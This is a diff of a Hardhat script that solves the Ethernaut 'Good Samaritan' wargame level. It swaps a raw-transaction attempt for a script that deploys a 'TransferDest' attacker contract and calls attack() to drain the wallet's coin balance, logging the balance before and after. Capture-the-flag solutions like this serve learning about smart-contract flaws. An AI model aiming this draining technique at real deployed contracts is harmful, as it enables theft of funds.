@@ -1,32 +1,24 @@
 const { ethers } = require("hardhat");
 const { BigNumber } = require("ethers");
 const Runner = require("./lib/runner");
-const { utils } = require("hash.js");
+const utils = require("./lib/utils");
 
 Runner.run(async (provider, owner) => { 
     
-    //PLACE THE ALIEN CODEX CONTRACT ADDRESS HERE (Ethernaut: contract.address) 
+    //PLACE THE GOOD SAMARITAN CONTRACT ADDRESS HERE (Ethernaut: contract.address) 
     const contractAddr = "0x4c0527dA9802c121cc74A322578B3F73138C056C"; 
     
-    const contract = await ethers.getContractAt("GoodSamaritan", contractAddr); 
+    const contract = await ethers.getContractAt("GoodSamaritan", contractAddr);
+    const wallet = await ethers.getContractAt("Wallet", await contract.wallet());
+    const coin = await ethers.getContractAt("Coin", await wallet.coin()); 
 
     console.log("* * * ");
+
+    console.log(`initial balance is ${await coin.balances(wallet.address)}`); 
     
-    const walletAddr = await contract.wallet();
-    const wallet = await ethers.getContractAt("Wallet", walletAddr); 
-    const coinAddr = await wallet.coin(); 
-    const coin = await ethers.getContractAt("Coin", coinAddr); 
-    console.log(walletAddr); 
-    console.log(await coin.balances(walletAddr)); 
+    const attacker = await utils.deployContractSilent("TransferDest");
+    await attacker.attack(contract.address); 
     
-    const signer = provider.getSigner(owner);
-    const funcSelector = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("NotEnoughBalance()")).substring(0, 10);
-    console.log(funcSelector);
+    console.log(`balance is now ${await coin.balances(wallet.address)}`); 
     
-    tx = {
-        to: contractAddr,
-        value: 0,
-        data: funcSelector
-    };
-    const transaction = await signer.sendTransaction(tx);
 });
